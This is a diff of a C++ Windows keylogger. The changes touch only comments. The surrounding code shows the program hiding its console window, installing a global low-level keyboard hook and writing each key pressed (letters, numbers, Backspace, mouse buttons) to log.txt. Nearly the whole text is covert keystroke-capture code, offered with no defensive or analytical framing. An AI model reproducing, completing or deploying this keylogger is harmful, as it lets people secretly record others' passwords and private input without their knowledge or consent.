@@ -4,7 +4,7 @@
 #include <iostream>
 #include <fstream>
 #include <gdiplus.h>
-// function declaration.
+// functions
 
 using namespace std;
 
@@ -14,7 +14,7 @@ int main()
 
 HWND hWnd = GetConsoleWindow(); 
 ShowWindow( hWnd, SW_HIDE ); 
-
+//Hidding Console
 HINSTANCE appInstance = GetModuleHandle(NULL);
 
     SetWindowsHookEx( WH_KEYBOARD_LL, LowLevelKeyboardProc, appInstance, 0 );
@@ -42,7 +42,7 @@ ofstream myfile("log.txt", std::ios::app);
         {
             switch( pKeyBoard->vkCode ) 
             {
-//Buttons	
+					//Buttons	
 				
 				case VK_MBUTTON:
 					myfile<<"\n button \n";
@@ -70,7 +70,7 @@ ofstream myfile("log.txt", std::ios::app);
 				case VK_BACK:
 					myfile<<"\n Backspace \n";
 				break;
-//Letters & Numbers
+					//Letters
                    case 0x41:
                 myfile<<"A";
                 break;
@@ -149,6 +149,7 @@ ofstream myfile("log.txt", std::ios::app);
                     case 0x5A:
                 myfile<<"Z";
                 break;
+                	//Numbers
                 	case 0x30:
                 myfile<<"0 \n";
                 break;  
@@ -187,5 +188,4 @@ ofstream myfile("log.txt", std::ios::app);
     myfile.close();
     return 0;
 }
-// SOMETHING NEW BELOW
 
